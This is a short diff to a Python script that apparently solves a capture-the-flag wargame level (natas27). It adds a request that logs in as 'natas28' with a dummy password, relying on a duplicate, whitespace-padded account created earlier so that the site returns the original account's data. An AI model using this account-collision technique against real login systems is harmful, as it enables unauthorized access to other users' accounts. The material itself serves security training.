@@ -103,3 +103,15 @@ params = {
 response = session.get(URL, params=params)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
+
+
+# now, in the database, there is the original natas28 and natas28 with trailing whitespaces with our password
+# according to the referece site, if we were to select natas28, it will give back the original entry of natas28
+# and thus, we will get back the data of the original natas28
+params = {
+    "username" : "natas28",
+    "password" : "randompassword"
+}
+response = session.get(URL, params=params)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
